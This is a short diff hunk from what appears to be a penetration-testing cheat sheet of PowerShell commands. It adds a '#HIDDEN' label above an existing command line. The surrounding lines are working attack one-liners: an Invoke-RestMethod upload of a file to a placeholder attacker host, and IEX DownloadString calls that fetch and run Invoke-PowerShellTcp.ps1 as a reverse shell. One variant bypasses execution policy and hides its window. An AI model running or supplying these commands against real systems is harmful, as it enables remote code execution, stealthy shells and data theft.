@@ -44,5 +44,6 @@ Invoke-RestMethod -Uri http://<LocalIPAddress>:<PORT>/<FILE> -Method Post -InFil
 ```ps
 %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
 C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://<LocalIPAddress>:<PORT>/Invoke-PowerShellTcp.ps1')
+#HIDDEN
 C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.Webclient).DownloadString('http://<LocalIPAddress>:<PORT>/Invoke-PowerShellTcp.ps1')
 ```
